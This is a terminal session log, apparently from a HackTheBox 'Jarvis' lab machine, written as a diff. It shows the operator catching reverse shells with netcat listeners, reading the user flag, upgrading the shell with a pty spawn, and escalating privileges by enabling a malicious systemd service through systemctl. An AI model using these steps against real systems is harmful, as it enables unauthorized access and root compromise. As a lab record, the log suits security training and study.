@@ -1,0 +1,130 @@
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #nc -nvlp 9002 > simple.py          
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                      
+Ncat: Listening on :::9002               
+Ncat: Listening on 0.0.0.0:9002          
+Ncat: Connection from 10.10.10.143.      
+Ncat: Connection from 10.10.10.143:45518.                                         
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #ls                                 
+connection.b64.php  etc_passwd_file_ways.png  mysql_hashes             nmap   room.b64.php  simple.py                    weird-chars                                
+connection.php      mysql-cred                mysql-sql-injection.png  notes  room.php      username-password-mysql.png  www                                        
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #less simple.py                     
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #vim simple.py                      
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #clear                              
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                      
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.143.      
+Ncat: Connection from 10.10.10.143:48586.                                         
+www-data@jarvis:/var/lib/php/sessions$ whoami                                     
+whoami                                   
+www-data                                 
+www-data@jarvis:/var/lib/php/sessions$ ^C
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                      
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.143.      
+Ncat: Connection from 10.10.10.143:48588.                                         
+pepper@jarvis:/var/lib/php/sessions$ ls  
+ls                                       
+ls: cannot open directory '.': Permission denied                                  
+pepper@jarvis:/var/lib/php/sessions$ cd ~
+cd ~                                     
+pepper@jarvis:~$ ls                      
+ls                                       
+Web                                      
+user.txt                                 
+pepper@jarvis:~$ cat user.txt            
+cat user.txt                             
+2afa36c4f05b37b34259c93551f5c44f         
+pepper@jarvis:~$ vi /tmp/shell.service   
+vi /tmp/shell.service                    
+Vim: Warning: Output is not to a terminal                                         
+Vim: Warning: Input is not from a terminal                                        
+pepper@jarvis:~$ cat /tmp/shell.service  
+cat //shell.service                      
+cat: //shell.service: No such file or directory                                   
+pepper@jarvis:~$ clear                   
+clear                                    
+pepper@jarvis:~$ python -c "import pty ;pty.spawn('/bin/bash')"                   
+python -c "import pty ;pty.spawn('/bin/bash')"                                    
+pepper@jarvis:~$ ^Z                      
+[1]+  Stopped                 nc -nvlp 9001                                       
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #stty raw -echo                     
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #nc -nvlp 9001                      
+
+pepper@jarvis:~$ ls                      
+Web  user.txt                            
+pepper@jarvis:~$ cd /tmp                 
+pepper@jarvis:/tmp$ ls                   
+shell.service  shell.sh                  
+pepper@jarvis:/tmp$ cat shell.service    
+ce]                                      
+TType=oneshot                            
+ExecStart=/bin/bash -c "/tmp/shell.sh"   
+[Install]                                
+WantedBy=multi-user.target               
+pepper@jarvis:/tmp$ vi shell.service     
+pepper@jarvis:/tmp$ cat shell.service    
+
+[Service]                                
+Type=oneshot                             
+ExecStart=/bin/bash -c "/tmp/shell.sh"   
+[Install]                                
+WantedBy=multi-user.target               
+pepper@jarvis:/tmp$ vi shell.sh          
+pepper@jarvis:/tmp$ chmod +x shell.sh    
+chmod: changing permissions of 'shell.sh': Operation not permitted                
+pepper@jarvis:/tmp$ ls -la               
+total 16                                 
+drwxrwxrwt  2 root     root     4096 Jan  8 08:54 .                               
+drwxr-xr-x 23 root     root     4096 Mar  3  2019 ..                              
+-rw-r--r--  1 pepper   pepper    100 Jan  8 08:52 shell.service                   
+-rwxrwxrwx  1 www-data www-data   54 Jan  8 08:54 shell.sh                        
+pepper@jarvis:/tmp$ cp shell.s* ~        
+pepper@jarvis:/tmp$ cd ~                 
+pepper@jarvis:~$ ls                      
+Web  shell.service  shell.sh  user.txt   
+pepper@jarvis:~$ systemctl enable shell.service                                   
+Failed to enable unit: File shell.service: No such file or directory              
+pepper@jarvis:~$ vi shell.service        
+pepper@jarvis:~$ systemctl enable shell.service                                   
+Failed to enable unit: File shell.service: No such file or directory              
+pepper@jarvis:~$ vi /tmp/shell.sh        
+pepper@jarvis:~$ vi shell.sh             
+pepper@jarvis:~$ vi shell.service        
+pepper@jarvis:~$ systemctl enable /home/pepper/shell.service                      
+Created symlink /etc/systemd/system/multi-user.target.wants/shell.service -> /home/pepper/shell.service.                   
+Created symlink /etc/systemd/system/shell.service -> /home/pepper/shell.service.  
+pepper@jarvis:~$ ls -la                  
+total 40                                 
+drwxr-xr-x 4 pepper pepper 4096 Jan  8 09:05 .                                    
+drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..                                   
+lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -> /dev/null           
+-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout                         
+-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc                              
+drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano                                
+-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile                             
+drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web                                  
+-rw-r--r-- 1 pepper pepper   88 Jan  8 09:05 shell.service                        
+-rwxr-xr-x 1 pepper pepper   54 Jan  8 09:03 shell.sh                             
+-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt                             
+pepper@jarvis:~$ systemctl enable --now /home/pepper/shell.service                
+pepper@jarvis:~$ vi shell.sh             
+pepper@jarvis:~$ vi shell.service        
+pepper@jarvis:~$ systemctl enable /home/pepper/shell.service                                                                                                        
+pepper@jarvis:~$ systemctl link /home/pepper/arrow.service                                                                                                          
+Created symlink /etc/systemd/system/arrow.service -> /home/pepper/arrow.service.  
+pepper@jarvis:~$ chmod +x shell.sh       
+pepper@jarvis:~$ systemctl enable --now /home/pepper/arrow.service                
+Created symlink /etc/systemd/system/multi-user.target.wants/arrow.service -> /home/pepper/arrow.service.                   
